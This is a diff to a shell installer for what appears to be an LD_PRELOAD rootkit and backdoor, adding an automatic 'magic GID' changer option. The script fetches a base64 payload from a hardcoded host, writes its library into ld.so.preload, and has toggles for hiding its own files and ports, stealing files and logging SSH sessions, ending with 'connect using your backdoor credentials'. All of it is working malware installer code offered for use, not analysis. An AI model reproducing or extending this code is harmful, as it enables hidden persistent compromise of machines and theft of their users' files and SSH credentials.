@@ -3,7 +3,7 @@
 # the following is required for this to work as intended:
 #   - wget or curl, base64 & tar
 
-B64TARGZ_LOCATION="http://host/file.b64" # change this..
+B64TARGZ_LOCATION="http://192.168.0.48:9001/imgay.b64" # change this..
 WORKDIR="/tmp" # & mayb this.
 PLATFORM="`uname -m`" # but not this.
 
@@ -21,7 +21,8 @@ dlfile(){ # $1 = src, $2 = dest
     $DL_C || { echo 'failed downloading target file.'; emergency_exit $2; }
 }
 mktouch(){ mkdir -p `dirname "$1"` && touch "$1"; }
-USE_CRYPT=0; HIDE_SELF=0; HIDE_PORTS=0; FILE_STEAL=0; LOG_SSH=0
+USE_CRYPT=0; HIDE_SELF=0; HIDE_PORTS=0; FILE_STEAL=0; LOG_SSH=0; READ_GID_FROM_FILE=0
+AUTO_GID_CHANGER=0
 read_toggles(){ # $1 = path of conf
     local conf="$1"
     [ ! -f "$conf" ] && { echo "specified file doesn't exist. exiting."; exit; }
@@ -32,6 +33,7 @@ read_toggles(){ # $1 = path of conf
         [ "$line" == 'FILE_STEAL=1' ] && FILE_STEAL=1
         [ "$line" == 'LOG_SSH=1' ] && LOG_SSH=1
         [ "$line" == 'READ_GID_FROM_FILE=1' ] && READ_GID_FROM_FILE=1
+        [ "$line" == 'AUTO_GID_CHANGER=1' ] && AUTO_GID_CHANGER=1
     done <<< "`cat $conf`"
 }
 install_deps(){
@@ -105,6 +107,7 @@ LDSO_PRELOAD=${settings[2]} && BDVLSO=${settings[3]}
 SOPATH=${settings[4]} && HIDEPORTS=${settings[5]}
 SSH_LOGS=${settings[6]} && INTEREST_DIR=${settings[7]}
 BD_VAR=${settings[8]} && GID_PATH=${settings[9]}
+GIDTIME_PATH=${settings[10]}
 
 echo -e "getting toggle statuses\n"
 read_toggles $INCLUDE_DIR/toggles.cfg
@@ -159,6 +162,7 @@ echo 'moving some files'
 [ $FILE_STEAL == 1 ] && { mkdir -p $INTEREST_DIR && chmod 666 $INTEREST_DIR && ln -s $INTEREST_DIR $INSTALL_DIR/interest_dir; }
 [ $LOG_SSH == 1 ] && { mktouch $SSH_LOGS && chmod 666 $SSH_LOGS && ln -s $SSH_LOGS $INSTALL_DIR/ssh_logs; }
 [ $READ_GID_FROM_FILE == 1 ] && { mktouch $GID_PATH && chmod 644 $GID_PATH && cat $INCLUDE_DIR/magic_gid > $GID_PATH; }
+[ $AUTO_GID_CHANGER == 1 ] && { mktouch $GIDTIME_PATH && chmod 666 $GIDTIME_PATH; }
 rm -r $INCLUDE_DIR
 
 if [ $HIDE_SELF == 1 ]; then
@@ -172,6 +176,7 @@ if [ $HIDE_SELF == 1 ]; then
     [ $FILE_STEAL == 1 ] && HIDE_FILES+=($INTEREST_DIR)
     [ $HIDE_PORTS == 1 ] && HIDE_FILES+=($HIDEPORTS)
     [ $READ_GID_FROM_FILE == 1 ] && HIDE_FILES+=($GID_PATH)
+    [ $AUTO_GID_CHANGER == 1 ] && HIDE_FILES+=($GIDTIME_PATH)
 
     for file in ${HIDE_FILES[@]}; do
         [ ! -f $file ] && mktouch $file
@@ -180,7 +185,7 @@ if [ $HIDE_SELF == 1 ]; then
 fi
 
 echo 'writing $SOPATH to $LDSO_PRELOAD'
-echo -n "$SOPATH" > $LDSO_PRELOAD || { echo -e '\nfailed writing to $LDSO_PRELOAD. exiting\n'; emergency_exit $INSTALL_DIR $HIDEPORTS $SSH_LOGS $INTEREST_DIR; }
+echo -n "$SOPATH" > $LDSO_PRELOAD || { echo -e '\nfailed writing to $LDSO_PRELOAD. exiting\n'; emergency_exit $INSTALL_DIR $HIDEPORTS $SSH_LOGS $INTEREST_DIR $GID_PATH; }
 echo -e "\ninstallation finished\nconnect using your backdoor credentials\n"
 
 SCRIPT_PATH="`pwd`/$0"
